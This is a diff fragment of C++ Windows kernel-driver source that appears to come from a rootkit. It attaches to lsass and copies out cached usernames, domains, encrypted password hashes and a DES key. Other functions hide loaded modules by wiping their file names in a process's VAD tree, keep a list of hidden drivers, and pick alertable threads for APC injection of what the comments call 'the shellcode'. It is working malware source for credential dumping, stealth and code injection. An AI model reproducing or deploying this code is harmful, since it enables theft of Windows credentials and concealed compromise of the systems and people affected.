+			this->cachedLsassInfo.Creds[credentialsIndex].Domain.Buffer = NULL;
+			status = CopyUnicodeString(lsass, &currentCredentials->Domain, IoGetCurrentProcess(),
+				&this->cachedLsassInfo.Creds[credentialsIndex].Domain, KernelMode);
+
+			if (!NT_SUCCESS(status)) {
+				FreeVirtualMemory(this->cachedLsassInfo.Creds[credentialsIndex].Username.Buffer);
+				break;
+			}
+
+			this->cachedLsassInfo.Creds[credentialsIndex].EncryptedHash.Buffer = NULL;
+			status = CopyUnicodeString(lsass, &currentCredentials->Credentials->PrimaryCredentials->Credentials,
+				IoGetCurrentProcess(), &this->cachedLsassInfo.Creds[credentialsIndex].EncryptedHash, KernelMode);
+			
+			if (!NT_SUCCESS(status)) {
+				FreeVirtualMemory(this->cachedLsassInfo.Creds[credentialsIndex].Domain.Buffer);
+				FreeVirtualMemory(this->cachedLsassInfo.Creds[credentialsIndex].Username.Buffer);
+				break;
+			}
+			validCredentialsCount++;
+		}
+
+	} while (false);
+	KeUnstackDetachProcess(&state);
+
+	if (!NT_SUCCESS(status)) {
+		if (credentialsIndex > 0) {
+			for (ULONG i = 0; i < credentialsIndex; i++) {
+				FreeVirtualMemory(this->cachedLsassInfo.Creds[credentialsIndex].EncryptedHash.Buffer);
+				FreeVirtualMemory(this->cachedLsassInfo.Creds[credentialsIndex].Domain.Buffer);
+				FreeVirtualMemory(this->cachedLsassInfo.Creds[credentialsIndex].Username.Buffer);
+			}
+		}
+
+		if (this->cachedLsassInfo.Creds)
+			FreeVirtualMemory(this->cachedLsassInfo.Creds);
+
+		if (this->cachedLsassInfo.DesKey.Data)
+			FreeVirtualMemory(this->cachedLsassInfo.DesKey.Data);
+	}
+	else {
+		this->cachedLsassInfo.Count = validCredentialsCount;
+		*allocationSize = validCredentialsCount;
+	}
+
+	if (lsass)
+		ObDereferenceObject(lsass);
+
+	return status;
+}
+
+/*
+* Description:
+* GetCredentials is responsible for getting credentials from lsass.
+*
+* Parameters:
+* @credentials [_Inout_ IoctlCredentials*] -- Credential entry to get from the cachedLsassInfo.
+*
+* Returns:
+* @status	 [NTSTATUS]			 -- Whether successfuly sent or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::GetCredentials(_Inout_ IoctlCredentials* credentials) {
+	SIZE_T bytesWritten = 0;
+	SIZE_T i = 0;
+	NTSTATUS status = STATUS_SUCCESS;
+
+	if (!credentials)
+		return STATUS_INVALID_PARAMETER;
+	AutoLock lock(this->cachedLsassInfo.Lock);
+
+	if (credentials->Count == 0) {
+		credentials->Count = this->cachedLsassInfo.Count;
+		return STATUS_SUCCESS;
+	}
+	status = MmCopyVirtualMemory(IoGetCurrentProcess(), this->cachedLsassInfo.DesKey.Data,
+		IoGetCurrentProcess(), credentials->DesKey.Data, this->cachedLsassInfo.DesKey.Size, KernelMode, &bytesWritten);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	for (i = 0; i < credentials->Count; i++) {
+		status = ProbeAddress(&credentials->Creds[i], sizeof(Credentials), sizeof(Credentials), STATUS_INVALID_ADDRESS);
+
+		if (!NT_SUCCESS(status))
+			break;
+		status = CopyUnicodeString(IoGetCurrentProcess(), &credentials->Creds[i].Username, IoGetCurrentProcess(),
+			&credentials->Creds[i].Username, UserMode);
+
+		if (!NT_SUCCESS(status))
+			break;
+		status = CopyUnicodeString(IoGetCurrentProcess(), &credentials->Creds[i].Domain, IoGetCurrentProcess(),
+			&credentials->Creds[i].Domain, UserMode);
+
+		if (!NT_SUCCESS(status))
+			break;
+		status = CopyUnicodeString(IoGetCurrentProcess(), &credentials->Creds[i].EncryptedHash, IoGetCurrentProcess(),
+			&credentials->Creds[i].EncryptedHash, UserMode);
+
+		if (!NT_SUCCESS(status))
+			break;
+	}
+	if (!NT_SUCCESS(status)) {
+		for (size_t j = 0; j <= i; j++) {
+			FreeVirtualMemory(credentials->Creds[j].Username.Buffer);
+			FreeVirtualMemory(credentials->Creds[j].Domain.Buffer);
+			FreeVirtualMemory(credentials->Creds[j].EncryptedHash.Buffer);
+		}
+		return status;
+	}
+
+	this->cachedLsassInfo.Count = 0;
+	FreeVirtualMemory(this->cachedLsassInfo.Creds);
+	FreeVirtualMemory(this->cachedLsassInfo.DesKey.Data);
+	return status;
+}
+
+/*
+* Description:
+* VadHideObject is responsible for hiding a specific node inside a VAD tree.
+*
+* Parameters:
+* @process			 [_Inout_ PEPROCESS] -- Target to process to search on its VAD.
+* @targetAddress	 [_In_ ULONG_PTR]	 -- Virtual address of the module to hide.
+*
+* Returns:
+* @status			 [NTSTATUS]			 -- STATUS_SUCCESS is hidden else error.
+*/
+_IRQL_requires_max_(DISPATCH_LEVEL)
+NTSTATUS MemoryHandler::VadHideObject(_Inout_ PEPROCESS process, _In_ ULONG_PTR targetAddress) {
+	PRTL_BALANCED_NODE node = NULL;
+	PMMVAD_SHORT shortNode = NULL;
+	PMMVAD longNode = NULL;
+	NTSTATUS status = STATUS_INVALID_PARAMETER;
+	ULONG_PTR targetAddressStart = targetAddress >> PAGE_SHIFT;
+
+	// Finding the VAD node associated with the target address.
+	ULONG vadRootOffset = GetVadRootOffset();
+	ULONG pageCommitmentLockOffset = GetPageCommitmentLockOffset();
+
+	if (vadRootOffset == 0 || pageCommitmentLockOffset == 0)
+		return STATUS_INVALID_ADDRESS;
+
+	PRTL_AVL_TABLE vadTable = reinterpret_cast<PRTL_AVL_TABLE>(reinterpret_cast<PUCHAR>(process) + vadRootOffset);
+	EX_PUSH_LOCK pageTableCommitmentLock = reinterpret_cast<EX_PUSH_LOCK>(reinterpret_cast<PUCHAR>(process) + pageCommitmentLockOffset);
+	TABLE_SEARCH_RESULT res = VadFindNodeOrParent(vadTable, targetAddressStart, &pageTableCommitmentLock, &node);
+
+	if (res != TableFoundNode)
+		return STATUS_NOT_FOUND;
+
+	shortNode = reinterpret_cast<PMMVAD_SHORT>(node);
+
+	// Hiding the image name or marking the area as no access.
+	if (shortNode->u.VadFlags.VadType == VadImageMap) {
+		longNode = reinterpret_cast<PMMVAD>(shortNode);
+
+		if (!longNode->Subsection)
+			return STATUS_INVALID_ADDRESS;
+
+		if (!longNode->Subsection->ControlArea || !longNode->Subsection->ControlArea->FilePointer.Object)
+			return STATUS_INVALID_ADDRESS;
+
+		PFILE_OBJECT fileObject = reinterpret_cast<PFILE_OBJECT>(longNode->Subsection->ControlArea->FilePointer.Value & ~0xF);
+
+		if (fileObject->FileName.Length > 0)
+			RtlSecureZeroMemory(fileObject->FileName.Buffer, fileObject->FileName.Length);
+
+		status = STATUS_SUCCESS;
+	}
+	else if (shortNode->u.VadFlags.VadType == VadDevicePhysicalMemory) {
+		shortNode->u.VadFlags.Protection = NO_ACCESS;
+		status = STATUS_SUCCESS;
+	}
+	return status;
+}
+
+/*
+* Description:
+* VadFindNodeOrParent is responsible for finding a node inside the VAD tree.
+*
+* Parameters:
+* @table				   [_In_ PRTL_AVL_TABLE]	   -- The table to search for the specific
+* @targetPageAddress	   [_In_ ULONG_PTR]			   -- The start page address of the searched mapped object.
+* @pageTableCommitmentLock [_Inout_ EX_PUSH_LOCK*]	   -- The lock to acquire before searching the tree.
+* @outNode				   [_Out_ PRTL_BALANCED_NODE*] -- NULL if wasn't find, else the result described in the Returns section.
+*
+* Returns:
+* @result				   [TABLE_SEARCH_RESULT] --
+* TableEmptyTree if the tree was empty
+* TableFoundNode if the key is found and the OutNode is the result node
+* TableInsertAsLeft / TableInsertAsRight if the node was not found and the OutNode contains what will be the out node (right or left respectively).
+*/
+_IRQL_requires_max_(DISPATCH_LEVEL)
+TABLE_SEARCH_RESULT MemoryHandler::VadFindNodeOrParent(_In_ PRTL_AVL_TABLE table, _In_ ULONG_PTR targetPageAddress,
+	_Inout_ EX_PUSH_LOCK* pageTableCommitmentLock, _Out_ PRTL_BALANCED_NODE* outNode) {
+	PRTL_BALANCED_NODE child = NULL;
+	PRTL_BALANCED_NODE nodeToCheck = NULL;
+	PMMVAD_SHORT virtualAddressToCompare = NULL;
+	ULONG_PTR startAddress = 0;
+	ULONG_PTR endAddress = 0;
+	TABLE_SEARCH_RESULT result = TableEmptyTree;
+
+	if (!table || !outNode || !pageTableCommitmentLock)
+		return result;
+	ExAcquirePushLockExclusiveEx(pageTableCommitmentLock, 0);
+
+	if (table->NumberGenericTableElements == 0 && table->DepthOfTree == 0) {
+		ExReleasePushLockExclusiveEx(pageTableCommitmentLock, 0);
+		return result;
+	}
+
+	nodeToCheck = reinterpret_cast<PRTL_BALANCED_NODE>(&table->BalancedRoot);
+
+	while (true) {
+		if (!nodeToCheck)
+			break;
+
+		virtualAddressToCompare = reinterpret_cast<PMMVAD_SHORT>(nodeToCheck);
+		startAddress = static_cast<ULONG_PTR>(virtualAddressToCompare->StartingVpn);
+		endAddress = static_cast<ULONG_PTR>(virtualAddressToCompare->EndingVpn);
+
+		startAddress |= static_cast<ULONG_PTR>(virtualAddressToCompare->StartingVpnHigh) << 32;
+		endAddress |= static_cast<ULONG_PTR>(virtualAddressToCompare->EndingVpnHigh) << 32;
+
+		if (targetPageAddress < startAddress) {
+			child = nodeToCheck->Left;
+
+			if (child) {
+				nodeToCheck = child;
+				continue;
+			}
+			*outNode = nodeToCheck;
+			result = TableInsertAsLeft;
+			break;
+		}
+		else if (targetPageAddress <= endAddress) {
+			*outNode = nodeToCheck;
+			result = TableFoundNode;
+			break;
+		}
+		else {
+			child = nodeToCheck->Right;
+
+			if (child) {
+				nodeToCheck = child;
+				continue;
+			}
+
+			*outNode = nodeToCheck;
+			result = TableInsertAsRight;
+			break;
+		}
+	}
+	ExReleasePushLockExclusiveEx(pageTableCommitmentLock, 0);
+	return result;
+}
+
+/*
+* Description:
+* FindAlertableThread is responsible for finding an alertable thread within a process.
+*
+* Parameters:
+* @pid		  [_In_ HANDLE] -- The process id to search on.
+*
+* Returns:
+* @thread	  [PETHREAD]	-- PETHREAD object if found, else exception.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+PETHREAD MemoryHandler::FindAlertableThread(_In_ HANDLE pid) {
+	ULONG alertableThread = 0;
+	ULONG guiThread = 0;
+	PETHREAD targetThread = NULL;
+	PSYSTEM_PROCESS_INFO info = NULL;
+	ULONG infoSize = 0;
+
+	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);
+
+	while (status == STATUS_INFO_LENGTH_MISMATCH) {
+		FreeVirtualMemory(info);
+		info = AllocateMemory<PSYSTEM_PROCESS_INFO>(infoSize);
+
+		if (!info) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			break;
+		}
+
+		status = ZwQuerySystemInformation(SystemProcessInformation, info, infoSize, &infoSize);
+	}
+
+	if (!NT_SUCCESS(status) || !info) {
+		FreeVirtualMemory(info);
+		ExRaiseStatus(status);
+	}
+	status = STATUS_NOT_FOUND;
+
+	// Iterating the processes information until our pid is found.
+	while (info->NextEntryOffset) {
+		if (info->UniqueProcessId == pid) {
+			status = STATUS_SUCCESS;
+			break;
+		}
+		info = reinterpret_cast<PSYSTEM_PROCESS_INFO>(reinterpret_cast<PUCHAR>(info) + info->NextEntryOffset);
+	}
+
+	if (!NT_SUCCESS(status)) {
+		FreeVirtualMemory(info);
+		ExRaiseStatus(status);
+	}
+
+	// Finding a suitable thread.
+	for (ULONG i = 0; i < info->NumberOfThreads; i++) {
+		if (info->Threads[i].ClientId.UniqueThread == PsGetCurrentThreadId())
+			continue;
+		status = PsLookupThreadByThreadId(info->Threads[i].ClientId.UniqueThread, &targetThread);
+
+		if (!NT_SUCCESS(status))
+			continue;
+
+		if (PsIsThreadTerminating(targetThread)) {
+			ObDereferenceObject(targetThread);
+			targetThread = NULL;
+			continue;
+		}
+
+		guiThread = *reinterpret_cast<PULONG64>(reinterpret_cast<PUCHAR>(targetThread) + GUI_THREAD_FLAG_OFFSET) & 
+			GUI_THREAD_FLAG_BIT;
+		alertableThread = *reinterpret_cast<PULONG64>(reinterpret_cast<PUCHAR>(targetThread) + ALERTABLE_THREAD_FLAG_OFFSET) & 
+			ALERTABLE_THREAD_FLAG_BIT;
+
+		if (guiThread != 0 ||
+			alertableThread == 0 ||
+			*reinterpret_cast<PULONG64>(reinterpret_cast<PUCHAR>(targetThread) + THREAD_KERNEL_STACK_OFFSET) == 0 ||
+			*reinterpret_cast<PULONG64>(reinterpret_cast<PUCHAR>(targetThread) + THREAD_CONTEXT_STACK_POINTER_OFFSET) == 0) {
+			ObDereferenceObject(targetThread);
+			targetThread = NULL;
+			continue;
+		}
+		break;
+	}
+	FreeVirtualMemory(info);
+
+	if (!targetThread)
+		ExRaiseStatus(STATUS_NOT_FOUND);
+	return targetThread;
+}
+
+/*
+* Description:
+* FindHiddenDriver is responsible for searching if an item exists in the list of hidden drivers.
+*
+* Parameters:
+* @item	  [HiddenDriverItem*] -- Driver to search for.
+*
+* Returns:
+* @status [ULONG]			  -- If found the index else ITEM_NOT_FOUND.
+*/
+_IRQL_requires_max_(DISPATCH_LEVEL)
+bool MemoryHandler::FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenDriverEntry* driverEntry) const {
+	if (!driverPath || !IsValidPath(driverPath))
+		return false;
+
+	auto finder = [](_In_ const HiddenDriverEntry* item, _In_ wchar_t* driverPath) {
+		return _wcsicmp(item->DriverPath, driverPath) == 0;
+	};
+	HiddenDriverEntry* item = FindListEntry<HiddenDriversList, HiddenDriverEntry, wchar_t*>(hiddenDrivers, driverPath, finder);
+
+	if (!item)
+		return false;
+
+	if (driverEntry)
+		driverEntry = item;
+	return true;
+}
+
+/*
+* Description:
+* AddHiddenDriver is responsible for adding an item to the list of hidden drivers.
+*
+* Parameters:
+* @item	  [_Inout_ HiddenDriverItem&] -- Driver to add.
+*
+* Returns:
+* @status [bool]					  -- Whether successfully added or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+bool MemoryHandler::AddHiddenDriver(_Inout_ HiddenDriverEntry& item) {
+	if (!IsValidPath(item.DriverPath))
+		return false;
+
+	if (FindHiddenDriver(item.DriverPath, nullptr))
+		return false;
+	AddEntry(&this->hiddenDrivers, &item);
+	return true;
+}
+
+/*
+* Description:
+* ApcInjectionCallback is responsible for handling the APC cleanup.
+*
+* Parameters:
+* @Apc			   [PKAPC]			   -- The received APC.
+* @NormalRoutine   [PKNORMAL_ROUTINE*] -- The executed routine, in our case, the shellcode.
+* @NormalContext   [PVOID*]			   -- The first parameter.
+* @SystemArgument1 [PVOID*]			   -- The second parameter.
+* @SystemArgument2 [PVOID*]			   -- The third parameter.
+*
+* Returns:
+* There is no return value.
+*/
+VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
+	UNREFERENCED_PARAMETER(SystemArgument1);
+	UNREFERENCED_PARAMETER(SystemArgument2);
+
+	if (PsIsThreadTerminating(PsGetCurrentThread()))
+		*NormalRoutine = NULL;
+
+	if (PsGetCurrentProcessWow64Process())
+		PsWrapApcWow64Thread(NormalContext, (PVOID*)NormalRoutine);
+	ExFreePoolWithTag(Apc, DRIVER_TAG);
+}
+
+/*
+* Description:
+* PrepareApcCallback is responsible for force the APC execution.
+*
+* Parameters:
+* @Apc			   [PKAPC]			   -- The received APC.
+* @NormalRoutine   [PKNORMAL_ROUTINE*] -- The executed routine, in our case, the shellcode.
+* @NormalContext   [PVOID*]			   -- The first parameter.
+* @SystemArgument1 [PVOID*]			   -- The second parameter.
+* @SystemArgument2 [PVOID*]			   -- The third parameter.
+*
+* Returns:
+* There is no return value.
+*/
+VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
+	UNREFERENCED_PARAMETER(NormalRoutine);
+	UNREFERENCED_PARAMETER(NormalContext);
+	UNREFERENCED_PARAMETER(SystemArgument1);
+	UNREFERENCED_PARAMETER(SystemArgument2);
+
+	KeTestAlertThread(UserMode);
+	ExFreePoolWithTag(Apc, DRIVER_TAG);
+}
